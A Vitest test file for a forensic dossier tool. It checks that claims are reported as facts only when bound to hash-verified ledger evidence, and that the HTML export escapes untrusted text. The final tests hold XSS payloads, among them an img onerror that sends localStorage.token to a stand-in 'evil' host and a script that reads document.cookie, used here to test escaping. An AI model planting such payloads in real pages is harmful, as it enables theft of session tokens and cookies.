import { describe, expect, it } from "vitest";
import { ARMIVEX_CASE_DOSSIER } from "../demo-dossier";
import {
  NO_VERIFIED_EVIDENCE,
  isBoundToEvidence,
  isValidEvidenceReference,
  partitionAdmissibilityAudit,
  partitionAlternativeHypotheses,
  partitionSuspiciousFlows,
  partitionTimeline,
  verifiedEvidenceIds,
} from "../evidence-binding";
import { buildReportHTML, escapeHtml } from "../export-pdf";
import type { ForensicDossier, TimelineEvent } from "../types";

/** Hash-overený dôkaz vo WORM ledgeri (evidence_items.id). */
const VERIFIED = "11111111-1111-4111-8111-111111111111";
const PENDING = "22222222-2222-4222-8222-222222222222";
const UNKNOWN = "99999999-9999-4999-8999-999999999999";

const LEDGER = [
  { id: VERIFIED, integrityStatus: "verified", sha256Hash: "a".repeat(64), fileName: "zapisnica.pdf" },
  { id: PENDING, integrityStatus: "checking", sha256Hash: "b".repeat(64), fileName: "vypis.csv" },
  { id: "33333333-3333-4333-8333-333333333333", integrityStatus: "compromised", fileName: "x.pdf" },
];
const known = verifiedEvidenceIds(LEDGER);

function clone(): ForensicDossier {
  return JSON.parse(JSON.stringify(ARMIVEX_CASE_DOSSIER)) as ForensicDossier;
}

function dossierWith(timeline: TimelineEvent[]): ForensicDossier {
  const base = clone();
  base.facts.timeline = timeline;
  base.financialAnalysis = {
    totalVolume: 1000,
    cashVolume: 400,
    transferVolume: 600,
    cashRatioPercent: 40,
    suspiciousFlows: [
      {
        id: "flow-bound",
        date: "2026-01-05",
        payer: "Subjekt A",
        recipient: "Subjekt B",
        amount: 400,
        method: "cash_deposit",
        purpose: "Vklad hotovosti",
        redFlag: "Štruktúrované vklady",
        sourceRef: { documentId: "zapisnica.pdf", evidenceId: VERIFIED, page: 3 },
      },
      {
        id: "flow-unbound",
        date: "2026-01-06",
        payer: "Subjekt C",
        recipient: "Subjekt D",
        amount: 600,
        method: "wire_transfer",
        purpose: "Prevod bez dokladu",
        redFlag: "Neznámy pôvod",
      },
    ],
    financingConclusion: "Testovací záver",
  };
  return base;
}

const boundEvent: TimelineEvent = {
  time: "2026-01-05 10:00",
  event: "Zadržanie hotovosti pri kontrole",
  source: "Zápisnica č. 7",
  sourceRef: { documentId: "zapisnica.pdf", evidenceId: VERIFIED, page: 7, excerpt: "Zápisnica s. 7" },
  chainBreak: false,
};

const unboundEvent: TimelineEvent = {
  time: "2026-01-06 12:00",
  event: "UTOK_BEZ_OPORY_V_EVENT",
  source: "",
  chainBreak: false,
};

describe("verifiedEvidenceIds — WORM ledger is the only evidence source", () => {
  it("accepts only hash-verified ledger records", () => {
    expect([...known]).toEqual([VERIFIED]);
    expect(verifiedEvidenceIds([])).toEqual(new Set());
    expect(verifiedEvidenceIds(null)).toEqual(new Set());
    expect(verifiedEvidenceIds([{ id: "  ", integrityStatus: "verified" }])).toEqual(new Set());
  });

  it("never treats the AI-generated custody ledger or file names as evidence", () => {
    const dossier = dossierWith([
      {
        ...unboundEvent,
        event: "Tvrdenie viazané na podvrhnutý custody záznam",
        sourceRef: { documentId: "zapisnica.pdf", evidenceId: "TRACE-FORGED", page: 1 },
      },
    ]);
    dossier.custodyLedger = [
      {
        index: 0,
        id: "CL-FORGED",
        traceId: "TRACE-FORGED",
        timestamp: "2026-01-01T00:00:00Z",
        actor: "AI",
        action: "SEIZURE",
        location: "—",
        payloadHash: "0".repeat(64),
        prevHash: "0".repeat(64),
        hash: "0".repeat(64),
      },
    ];
    dossier.analysisMeta = { ...dossier.analysisMeta!, documentIds: ["zapisnica.pdf"] };
    expect(partitionTimeline(dossier, known).bound).toEqual([]);
    const hyps = dossier.alternativeHypotheses ?? [];
    hyps[0]!.sourceReferences = [{ evidenceId: "TRACE-FORGED", page: 2 }];
    expect(partitionAlternativeHypotheses(hyps, known).bound).toEqual([]);
  });
});

describe("evidence references for legal conclusions", () => {
  it("requires a verified evidence ID and a concrete page or paragraph locator", () => {
    expect(isValidEvidenceReference({ evidenceId: VERIFIED, page: 2 }, known)).toBe(true);
    expect(isValidEvidenceReference({ evidenceId: VERIFIED, paragraph: "odsek 4" }, known)).toBe(true);
    expect(isValidEvidenceReference({ evidenceId: VERIFIED, paragraph: "§ 119 ods. 2 TP" }, known)).toBe(false);
    expect(isValidEvidenceReference({ evidenceId: VERIFIED }, known)).toBe(false);
    expect(isValidEvidenceReference({ evidenceId: VERIFIED, page: 0 }, known)).toBe(false);
    expect(isValidEvidenceReference({ evidenceId: PENDING, page: 2 }, known)).toBe(false);
    expect(isValidEvidenceReference({ evidenceId: UNKNOWN, page: 2 }, known)).toBe(false);
  });

  it("partitions hypotheses and audit claims fail-closed", () => {
    const dossier = clone();
    const hypotheses = dossier.alternativeHypotheses ?? [];
    hypotheses[0]!.sourceReferences = [{ evidenceId: VERIFIED, page: 4 }];
    hypotheses[1]!.sourceReferences = [{ evidenceId: PENDING, paragraph: "odsek 3" }];
    const partition = partitionAlternativeHypotheses(hypotheses, known);
    expect(partition.bound.map((item) => item.id)).toEqual(["AH-1"]);
    expect(partition.unbound.map((item) => item.id)).toEqual(["AH-2"]);

    const audit = dossier.admissibilityAudit!;
    audit.sourceReferences = [{ evidenceId: VERIFIED, paragraph: "odsek 2" }];
    audit.defects[0]!.sourceEvidenceId = VERIFIED;
    audit.defects[0]!.sourcePage = 8;
    const auditPartition = partitionAdmissibilityAudit(audit, known);
    expect(auditPartition.summaryBound).toBe(true);
    expect(auditPartition.boundDefects).toHaveLength(1);
    expect(auditPartition.unboundDefects).toHaveLength(1);
  });

  it("a single invalid reference makes the whole hypothesis unbound", () => {
    const [h] = clone().alternativeHypotheses ?? [];
    h!.sourceReferences = [
      { evidenceId: VERIFIED, page: 1 },
      { evidenceId: UNKNOWN, page: 2 },
    ];
    expect(partitionAlternativeHypotheses([h!], known).unbound).toHaveLength(1);
  });
});

describe("isBoundToEvidence", () => {
  it("needs sourceRef.evidenceId of a verified record; documentId alone is not evidence", () => {
    expect(isBoundToEvidence(undefined, known)).toBe(false);
    expect(isBoundToEvidence({ documentId: "zapisnica.pdf" }, known)).toBe(false);
    expect(isBoundToEvidence({ documentId: VERIFIED }, known)).toBe(false);
    expect(isBoundToEvidence({ documentId: "x", evidenceId: PENDING }, known)).toBe(false);
    expect(isBoundToEvidence({ documentId: "x", evidenceId: VERIFIED }, known)).toBe(false); // bez locatora
    expect(isBoundToEvidence({ documentId: "x", evidenceId: VERIFIED, page: 1 }, known)).toBe(true);
  });
});

describe("partition", () => {
  it("chronology and flows split into bound facts and unbound claims", () => {
    const dossier = dossierWith([boundEvent, unboundEvent]);
    expect(partitionTimeline(dossier, known)).toEqual({ bound: [boundEvent], unbound: [unboundEvent] });
    const flows = partitionSuspiciousFlows(dossier, known);
    expect(flows.bound.map((f) => f.id)).toEqual(["flow-bound"]);
    expect(flows.unbound.map((f) => f.id)).toEqual(["flow-unbound"]);
  });

  it("without a loaded ledger nothing is bound", () => {
    const dossier = dossierWith([boundEvent]);
    expect(partitionTimeline(dossier, NO_VERIFIED_EVIDENCE).bound).toEqual([]);
  });
});

describe("export gate", () => {
  const dossier = dossierWith([boundEvent, unboundEvent]);
  const html = buildReportHTML(dossier, known);
  const chronologyStart = html.indexOf("<h2>Chronológia skutkov");
  const unboundStart = html.indexOf("<h2>Nezdrojované okolnosti");

  it("a bound event is in the factual chronology, an unbound one only in the unverified section", () => {
    const chronology = html.slice(chronologyStart, unboundStart);
    expect(chronology).toContain("Zadržanie hotovosti");
    expect(chronology).not.toContain("UTOK_BEZ_OPORY_V_EVENT");
    expect(html.slice(unboundStart, unboundStart + 2000)).toContain("UTOK_BEZ_OPORY_V_EVENT");
  });

  it("a bound flow is a fact, an unbound one is not", () => {
    const financialStart = html.indexOf("Podozrivé finančné toky");
    const unboundFlowsStart = html.indexOf("Toky bez viazania na dôkaz");
    const factTable = html.slice(financialStart, unboundFlowsStart);
    expect(factTable).toContain("Vklad hotovosti");
    expect(factTable).not.toContain("Prevod bez dokladu");
    expect(html.slice(unboundFlowsStart)).toContain("Prevod bez dokladu");
  });

  it("default export (no ledger) binds nothing — every claim is unverified", () => {
    const failClosed = buildReportHTML(dossierWith([boundEvent]));
    const chronologyStart2 = failClosed.indexOf("<h2>Chronológia skutkov");
    const unboundStart2 = failClosed.indexOf("<h2>Nezdrojované okolnosti");
    expect(unboundStart2).toBeGreaterThan(-1);
    expect(failClosed.slice(chronologyStart2, unboundStart2)).not.toContain("Zadržanie hotovosti");
  });

  it("hypotheses and § 119 claims without linkage are exported only as unverified", () => {
    const d = dossierWith([boundEvent]);
    const out = buildReportHTML(d, known);
    const unverifiedStart = out.indexOf("<h2>Neoverené tvrdenia (nie sú skutkom)</h2>");
    expect(unverifiedStart).toBeGreaterThan(-1);
    expect(out.slice(unverifiedStart)).toContain("Finančné prostriedky boli riadnou pôžičkou");
    expect(out.slice(0, unverifiedStart)).not.toContain("Finančné prostriedky boli riadnou pôžičkou");
  });

  it("bound audit and hypothesis appear in the verified sections", () => {
    const d = dossierWith([boundEvent]);
    d.alternativeHypotheses![0]!.sourceReferences = [{ evidenceId: VERIFIED, page: 12 }];
    d.admissibilityAudit!.sourceReferences = [{ evidenceId: VERIFIED, paragraph: "odsek 5" }];
    d.admissibilityAudit!.defects[0]!.sourceEvidenceId = VERIFIED;
    d.admissibilityAudit!.defects[0]!.sourcePage = 10;
    const out = buildReportHTML(d, known);
    expect(out).toContain("Alternatívne hypotézy viazané na dôkazy");
    expect(out).toContain("Audit procesnej prípustnosti (§ 119 TP)");
  });
});

describe("export escapes untrusted AI/document text (stored XSS)", () => {
  it("renders injected markup as text, never as elements", () => {
    const d = dossierWith([
      { ...boundEvent, event: `<img src=x onerror="fetch('//evil/'+localStorage.token)">` },
      { ...unboundEvent, event: "<script>alert(document.cookie)</script>" },
    ]);
    d.alternativeHypotheses![0]!.title = `"><svg onload=alert(1)>`;
    d.alternativeHypotheses![0]!.sourceReferences = [{ evidenceId: VERIFIED, page: 1 }];
    const out = buildReportHTML(d, known);
    expect(out).not.toContain("<img src=x");
    expect(out).not.toContain("<script>alert");
    expect(out).not.toContain("<svg onload");
    expect(out).toContain(escapeHtml(`<img src=x onerror="fetch('//evil/'+localStorage.token)">`));
    expect(out).toContain("&lt;script&gt;alert(document.cookie)&lt;/script&gt;");
  });

  it("escapeHtml covers the five HTML metacharacters", () => {
    expect(escapeHtml(`<a href="x" title='y'>&</a>`)).toBe("&lt;a href=&quot;x&quot; title=&#39;y&#39;&gt;&amp;&lt;/a&gt;");
  });
});
